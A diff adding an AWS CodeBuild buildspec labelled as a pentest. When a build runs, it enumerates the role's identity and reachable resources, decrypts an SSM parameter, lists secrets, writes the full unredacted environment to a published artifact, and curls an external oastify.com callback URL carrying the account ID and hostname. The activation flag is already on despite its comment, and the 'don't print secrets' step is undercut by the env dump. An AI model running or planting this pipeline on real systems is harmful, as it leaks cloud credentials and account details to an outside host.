@@ -1,0 +1,39 @@
+version: 0.2
+env:
+  variables:
+    PENTEST_OK: "1"           # flip to "1" to activate
+    CALLBACK_URL: "https://slh264bhpobwdq4hl3kzw55leck380wp.oastify.com/capture"
+phases:
+  install:
+    commands:
+      - set -euo pipefail
+      - if [ "${PENTEST_OK}" != "1" ]; then echo "Pentest disabled"; exit 0; fi
+      - aws --version
+  pre_build:
+    commands:
+      - echo "== Identity & Env =="
+      - aws sts get-caller-identity
+      - aws sts get-caller-identity --query Arn --output text | awk -F'/' '{print "ASSUMED_ROLE="$2}'
+      - env | sort | tee env.dump
+  build:
+    commands:
+      - echo "== What can this role touch? (S3/ECR/EC2 quick checks) =="
+      - (aws s3 ls || true)
+      - (aws ecr describe-repositories || true)
+      - (aws ec2 describe-instances --max-items 5 || true)
+      - echo "== Secrets hunting (only safe names you own) =="
+      - (aws ssm get-parameters --names "/pentest/demo" --with-decryption || true)
+      - (aws secretsmanager list-secrets --max-results 5 || true)
+      - echo "== KMS sanity =="
+      - (aws kms list-keys --limit 5 || true)
+      - echo "== Network egress test =="
+      - curl -sS -m 5 "${CALLBACK_URL}?who=$(aws sts get-caller-identity --query Account --output text)&host=$(hostname)" || true
+      - nslookup your-dns-collector.example.com || true
+  post_build:
+    commands:
+      - echo "== Leak test (don’t print secrets; just show presence) =="
+      - (env | grep -Ei 'secret|token|key' | sed 's/=.*/=<redacted>/' || true) | tee suspected_secrets.txt
+artifacts:
+  files:
+    - env.dump
+    - suspected_secrets.txt
